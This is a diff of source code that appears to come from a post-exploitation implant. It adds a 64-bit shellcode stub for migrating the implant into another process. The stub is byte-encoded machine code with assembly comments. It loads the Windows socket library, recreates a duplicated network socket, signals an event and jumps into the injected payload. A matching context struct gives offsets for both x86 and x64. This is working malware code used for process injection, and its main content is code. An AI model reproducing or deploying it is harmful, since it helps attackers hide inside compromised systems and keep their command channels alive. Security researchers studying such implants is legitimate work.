@@ -17,16 +17,18 @@
 
 typedef struct _MigrationStubContext
 {
-	LPVOID           loadLibrary;   // esi+0x00
-	LPVOID           payloadBase;   // esi+0x04
-	DWORD            payloadLength; // esi+0x08
-	LPVOID           wsaStartup;    // esi+0x0c
-	LPVOID           wsaSocket;     // esi+0x10
-	LPVOID           recv;          // esi+0x14
-	LPVOID           setevent;      // esi+0x18
-	LPVOID           event;         // esi+0x1c
-	CHAR             ws2_32[8];     // esi+0x20
-	WSAPROTOCOL_INFO info;          // esi+0x28
+	                                // x86      |  x64
+	                                // =========================
+	LPVOID           loadLibrary;   // esi+0x00 | rbp+0x00
+	LPVOID           payloadBase;   // esi+0x04 | rbp+0x08
+	DWORD            payloadLength; // esi+0x08 | rbp+0x10
+	LPVOID           wsaStartup;    // esi+0x0c | rbp+0x18
+	LPVOID           wsaSocket;     // esi+0x10 | rbp+0x20
+	LPVOID           recv;          // esi+0x14 | rbp+0x28
+	LPVOID           setevent;      // esi+0x18 | rbp+0x30
+	LPVOID           event;         // esi+0x1c | rbp+0x38
+	CHAR             ws2_32[8];     // esi+0x20 | rbp+0x40
+	WSAPROTOCOL_INFO info;          // esi+0x28 | rbp+0x48
 } MigrationStubContext;
 
 DWORD remote_request_core_migrate(Remote *remote, Packet *packet)
@@ -45,7 +47,36 @@ DWORD remote_request_core_migrate(Remote *remote, Packet *packet)
 	DWORD pid;
 	PUCHAR payload;
 
-	// Bug fix for Ticket #275: recv the migrate payload into a RWX buffer instead of straight onto the stack (Stephen Fewer).
+#ifdef _WIN64
+	BYTE stub[] =
+		"\x48\x89\xCD"                 //  mov rbp, rcx          ; rcx = MigrationStubContext *
+		"\x48\x81\xEC\x00\x40\x00\x00" //  sub esp, 0x4000       ; alloc space on stack
+		"\x49\x89\xE7"                 //  mov r15, rsp          ; save pointer to space for WSAStartup
+		"\x48\x81\xEC\x28\x00\x00\x00" //  sub esp, 0x28         ; alloc space for function calls
+		"\x48\x8D\x4D\x40"             //  lea rcx, [rbp+0x40]   ; rcx = MigrationStubContext->ws2_32
+		"\xFF\x55\x00"                 //  call qword [rbp+0x0]  ; kernel32!LoadLibraryA( "ws2_32" );
+		"\x4C\x89\xFA"                 //  mov rdx, r15          ;
+		"\x6A\x02"                     //  push byte +0x2        ;
+		"\x59"                         //  pop rcx               ; rcx = 2
+		"\xFF\x55\x18"                 //  call qword [rbp+0x18] ; ws2_32!WSAStartup( 2, &buff );
+		"\x4D\x31\xC0"                 //  xor r8, r8            ; zero  r8
+		"\x41\x50"                     //  push r8               ; null
+		"\x41\x50"                     //  push r8               ; null
+		"\x4C\x8D\x4D\x48"             //  lea r9, [rbp+0x48]    ; r9 = &WSAPROTOCOL_INFO
+		"\x6A\x02"                     //  push byte +0x2        ;
+		"\x5A"                         //  pop rdx               ; rdx = 2
+		"\x6A\x01"                     //  push byte +0x1        ;
+		"\x59"                         //  pop rcx               ; rcx = 2
+		"\xFF\x55\x20"                 //  call qword [rbp+0x20] ; ws2_32!WSASocket( 2, 2, 0, &info, 0, 0 );
+		"\x48\x89\xC7"                 //  mov rdi, rax          ; rdi now is our socket
+		"\x48\x8B\x4D\x38"             //  mov rcx, [rbp+0x38]   ; rcx = the event
+		"\xFF\x55\x30"                 //  call qword [rbp+0x30] ; kernel32!SetEvent( event );
+		"\x48\x8B\x45\x08"             //  mov rax, [rbp+0x8]    ; get the main payloads address
+		"\x48\x81\xE4\xF0\xFF\xFF\xFF" //  and esp, 0xfffffff0   ; ensure rsp is 16 byte aligned
+		"\x48\x89\xE5"                 //  mov rbp, rsp          ; give rbp a real value
+		"\x48\x81\xEC\x28\x00\x00\x00" //  sub esp, 0x28         ; alloc some space on stack
+		"\xFF\xE0";                    //  jmp rax               ; jump into the main payload
+#else
 	BYTE stub[] =
 		"\x8B\x74\x24\x04"         //  mov esi,[esp+0x4]         ; ESI = MigrationStubContext *
 		"\x89\xE5"                 //  mov ebp,esp               ; create stack frame
@@ -69,7 +100,7 @@ DWORD remote_request_core_migrate(Remote *remote, Packet *packet)
 		"\xFF\x56\x18"             //  call near [esi+0x18]      ; call setevent
 		"\xFF\x76\x04"             //  push dword [esi+0x04]     ; push the address of the payloadBase
 		"\xC3";                    //  ret                       ; return into the payload
-
+#endif
 	// Get the process identifier to inject into
 	pid = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_PID);
 
